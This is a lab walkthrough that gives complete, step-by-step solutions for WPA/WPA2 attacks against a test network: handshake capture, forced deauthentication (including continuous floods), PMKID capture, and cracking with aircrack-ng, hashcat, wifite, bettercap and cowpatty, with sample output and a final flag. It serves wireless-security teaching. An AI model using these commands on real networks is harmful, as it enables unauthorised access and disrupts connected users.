# Lab 05: WPA/WPA2 Attacks - Walkthrough

Complete step-by-step solution guide for WPA/WPA2 handshake capture and cracking.

```
+===============================================================+
|                    WALKTHROUGH GUIDE                           |
+===============================================================+
|  WARNING: This contains complete solutions.                   |
|  Try the exercises yourself first!                            |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  This walkthrough is for EDUCATIONAL PURPOSES ONLY.                 |
|                                                                      |
|  - Only perform these actions on networks you OWN                   |
|  - Or have EXPLICIT WRITTEN PERMISSION to test                      |
|  - Unauthorized access is a CRIMINAL OFFENSE                        |
|  - Set up an isolated lab environment for practice                  |
+=====================================================================+
```

## Lab Environment Setup

### Test Network Configuration

```
Test Network Settings:
─────────────────────────────────────
SSID:        TestNetwork
Security:    WPA2-Personal (PSK)
Password:    TestPassword123
Channel:     6
─────────────────────────────────────

This password is intentionally weak for testing.
It exists in rockyou.txt wordlist.
```

### Required Hardware Check

```bash
# Verify adapter supports injection
sudo aireplay-ng --test wlan0

# Expected output:
# 09:45:23  Trying broadcast probe requests...
# 09:45:23  Injection is working!
```

## Exercise 1: Handshake Capture - Complete Walkthrough

### Step 1: Enable Monitor Mode

```bash
# Check for and kill interfering processes
sudo airmon-ng check

# Output:
# Found 2 processes that could cause trouble.
#     PID Name
#     723 NetworkManager
#     912 wpa_supplicant

# Kill them
sudo airmon-ng check kill

# Output:
# Killing these processes:
#     PID Name
#     723 NetworkManager
#     912 wpa_supplicant

# Enable monitor mode
sudo airmon-ng start wlan0

# Output:
# PHY     Interface       Driver          Chipset
# phy0    wlan0           rtl8812au       Realtek Semiconductor Corp.
#         (monitor mode enabled on wlan0mon)

# Verify
iwconfig wlan0mon
# Mode:Monitor should be shown
```

### Step 2: Discover Target Network

```bash
# Scan for all WPA2 networks
sudo airodump-ng --encrypt WPA2 wlan0mon
```

**Sample Output:**
```
 CH  9 ][ Elapsed: 30 s ]

 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC    CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -42      285      156   12   6   54e  WPA2   CCMP    PSK  TestNetwork
 11:22:33:44:55:66  -68      142       45    3  11   54e  WPA2   CCMP    PSK  Neighbor_WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  DE:AD:BE:EF:CA:FE  -55   54e-54e      0      125
```

**Record Important Information:**
- Target BSSID: `AA:BB:CC:DD:EE:FF`
- Channel: `6`
- ESSID: `TestNetwork`
- Connected Client: `DE:AD:BE:EF:CA:FE`

### Step 3: Start Targeted Capture

```bash
# Terminal 1: Start capture on target
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Parameters:
# -c 6          : Lock to channel 6
# --bssid       : Target AP MAC
# -w wpa_capture: Output file prefix
```

**Watch the top-right corner for handshake notification!**

### Step 4: Wait for Handshake (Passive Method)

```
 CH  6 ][ Elapsed: 5 min ][ 2024-01-15 16:00

 BSSID              PWR RXQ  Beacons    #Data  #/s  CH   MB   ENC    CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -42  95     1567      856   15   6   54e  WPA2   CCMP    PSK  TestNetwork

 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  DE:AD:BE:EF:CA:FE  -55   54e-54e      5      567
```

If client reconnects naturally, you'll see:
```
 CH  6 ][ Elapsed: 7 min ][ WPA handshake: AA:BB:CC:DD:EE:FF
                             ↑
                    Handshake captured!
```

### Step 5: Force Handshake with Deauthentication

If no natural reconnection occurs:

```bash
# Terminal 2: Deauthenticate the client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c DE:AD:BE:EF:CA:FE wlan0mon

# Parameters:
# -0 5  : Send 5 deauthentication frames
# -a    : AP BSSID
# -c    : Client MAC to deauth

# Output:
# 16:05:15  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
# 16:05:15  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [ 0|63 ACKs]
# 16:05:16  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [63|64 ACKs]
# 16:05:16  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [62|63 ACKs]
```

**Terminal 1 should now show:**
```
 CH  6 ][ Elapsed: 8 min ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

### Step 6: Verify Handshake

```bash
# Stop capture (Ctrl+C in Terminal 1)

# Verify handshake quality
aircrack-ng wpa_capture-01.cap

# Output:
#                              Aircrack-ng 1.7
#
# Opening wpa_capture-01.cap
# Read 15678 packets.
#
#    #  BSSID              ESSID                     Encryption
#
#    1  AA:BB:CC:DD:EE:FF  TestNetwork               WPA (1 handshake)
#
# Choosing first network as target.
#
# Please specify a dictionary.

# Handshake confirmed!
```

### Step 7: Crack with Aircrack-ng

```bash
# Crack using rockyou wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
```

**Cracking in Progress:**
```
                               Aircrack-ng 1.7

      [00:00:15] 156789/14344392 keys tested (10452.60 k/s)

      Time left: 22 minutes, 51 seconds                         1.09%

                          KEY FOUND! [ TestPassword123 ]


      Master Key     : 8A 3B 7C 4D 9E 1F 2A 6B 5C 8D 7E 4F 3A 2B 1C 0D
                       9E 8F 7D 6C 5B 4A 3E 2D 1C 0B 9A 8F 7E 6D 5C 4B

      Transient Key  : 12 34 56 78 9A BC DE F0 12 34 56 78 9A BC DE F0
                       12 34 56 78 9A BC DE F0 12 34 56 78 9A BC DE F0
                       12 34 56 78 9A BC DE F0 12 34 56 78 9A BC DE F0
                       12 34 56 78 9A BC DE F0 12 34 56 78 9A BC DE F0

      EAPOL HMAC     : A1 B2 C3 D4 E5 F6 A7 B8 C9 D0 E1 F2 A3 B4 C5 D6
```

**Password Found: `TestPassword123`**

## Exercise 2: Forced Handshake - Complete Walkthrough

### Timing Comparison

**Passive Capture:**
- Wait time: 5-30 minutes (depends on client activity)
- Less disruptive
- May miss handshake if not monitoring when client connects

**Forced with Deauth:**
- Immediate (seconds after deauth)
- Disruptive to target client
- Guaranteed handshake if client reconnects

### Different Deauth Strategies

```bash
# Strategy 1: Target specific client (least disruptive)
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c DE:AD:BE:EF:CA:FE wlan0mon

# Strategy 2: Deauth all clients (more disruptive)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Strategy 3: Continuous deauth until handshake
# (Use sparingly - very disruptive)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# Ctrl+C when handshake captured
```

## Exercise 3: PMKID Attack - Complete Walkthrough

### Step 1: Install Tools

```bash
# Install hcxdumptool and hcxtools
sudo apt update
sudo apt install hcxdumptool hcxtools
```

### Step 2: Capture PMKID

```bash
# Method 1: Scan all networks for PMKID
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Let it run for 1-2 minutes, then Ctrl+C

# Method 2: Target specific BSSID
# First create filter file
echo "AABBCCDDEEFF" > targets.txt  # No colons in MAC!

sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
    --filterlist_ap=targets.txt --filtermode=2 --enable_status=1
```

**Expected Output:**
```
start capturing (press ctrl+c to terminate)...
FOUND PMKID CLIENT: AA:BB:CC:DD:EE:FF (TestNetwork) -> [PMKID captured]
...
```

### Step 3: Convert to Hashcat Format

```bash
# Convert pcapng to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng

# Output:
# reading from pmkid_capture.pcapng...
# summary capture file
# --------------------
# file name................................: pmkid_capture.pcapng
# file type................................: pcapng
# PMKID (best).............................: 1
# EAPOL....................................: 0

# View the hash
cat hash.hc22000

# Example output (PMKID format):
# WPA*01*4d4fe7aac3a2cecab195321ceb99a7d0*AABBCCDDEEFF*DEADBEEFCAFE*54657374*
#        ↑                               ↑            ↑            ↑
#        PMKID hash                      AP MAC       Client MAC   SSID (hex)
```

### Step 4: Crack with Hashcat

```bash
# Crack the PMKID
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# If you have a GPU, specify it:
hashcat -m 22000 -d 1 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Output during cracking:
# Session..........: hashcat
# Status...........: Running
# Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
# Hash.Target......: hash.hc22000
# Speed.#1.........:   412.3 kH/s (8.23ms)
# Recovered........: 1/1 (100.00%) Digests

# When found:
# WPA*01*4d4fe7aac3a2cecab195321ceb99a7d0*...*:TestPassword123
```

### Step 5: View Cracked Password

```bash
# Show all cracked passwords
hashcat -m 22000 hash.hc22000 --show

# Output:
# WPA*01*4d4fe7...:TestPassword123
```

## Exercise 4: Dictionary Attack Analysis

### Testing Different Password Strengths

**Test 1: Weak Password (in wordlist)**
```bash
# Password: "password123"
# Time to crack: ~2 seconds (appears early in rockyou.txt)
```

**Test 2: Medium Password (common pattern)**
```bash
# Password: "Summer2024!"
# Time to crack: ~5 minutes with rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

**Test 3: Strong Password (random)**
```bash
# Password: "Xk9#mP2$vL7@nQ4&"
# Time to crack: Effectively impossible with dictionary attack

# Even brute force would take:
# 95^16 = 4.4 × 10^31 combinations
# At 1 million guesses/second = 1.4 trillion years
```

### Cracking Speed Analysis

```bash
# Benchmark your system
hashcat -m 22000 -b

# Example output:
# Hashmode: 22000 - WPA-PBKDF2-PMKID+EAPOL
#
# Speed.#1.........:   412.3 kH/s (8.23ms)
#
# This means 412,300 password guesses per second
```

## Alternative Tools

### Wifite (Automated)

```bash
# Run wifite for automated attack
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt

# Wifite will:
# 1. Scan for WPA networks
# 2. Attempt handshake capture
# 3. Try PMKID attack
# 4. Crack captured handshakes
```

### Bettercap

```bash
# Start bettercap
sudo bettercap -iface wlan0mon

# In bettercap console:
wifi.recon on
wifi.show

# Capture handshake
wifi.deauth AA:BB:CC:DD:EE:FF

# View captured handshakes
wifi.show handshakes
```

### CoWPAtty (Alternative Cracker)

```bash
# Crack with cowpatty
cowpatty -f /usr/share/wordlists/rockyou.txt -r wpa_capture-01.cap -s TestNetwork
```

## Cleanup and Restoration

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Verify connectivity
ping -c 3 google.com

# Clean up capture files (optional)
rm -f wpa_capture* pmkid_capture* hash.hc22000
```

## Troubleshooting

### "No Handshake Captured"

```bash
# Check you're on the correct channel
sudo airodump-ng -c 6 wlan0mon

# Verify client is connected
# Look in STATION section

# Try more aggressive deauth
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### "Incomplete Handshake"

```bash
# Some messages missing - capture again
# Move closer to both AP and client
# Ensure good signal strength

# Check with pyrit
pyrit -r wpa_capture-01.cap analyze
```

### "PMKID Not Captured"

```bash
# Not all APs send PMKID
# Try different AP if testing multiple

# Verify your adapter supports the feature
# Try traditional handshake method instead
```

### "Hashcat CUDA/OpenCL Error"

```bash
# Update GPU drivers
sudo apt install nvidia-driver-XXX

# Or use CPU only
hashcat -m 22000 -D 1 hash.hc22000 wordlist.txt
# -D 1 : Use CPU device
```

## Summary

You've successfully learned:

1. **Handshake Capture**: airodump-ng + deauth → capture
2. **PMKID Attack**: hcxdumptool + hcxpcapngtool → client-less capture
3. **Cracking Methods**: aircrack-ng (CPU) and hashcat (GPU)
4. **Analysis**: Password strength vs. cracking time

**Key Takeaways:**
- WPA2 security depends entirely on password strength
- Dictionary attacks are effective against weak passwords
- Strong random passwords (16+ chars) are practically uncrackable
- WPA3 eliminates offline attack vulnerability

## Next Steps

Continue to [Lab 06: Deauthentication Attacks](../06-deauthentication-attacks/) to learn more about DoS attacks on wireless networks.

---

**Flag:** `FLAG{wp4_h4ndsh4k3_cr4ck3d}`
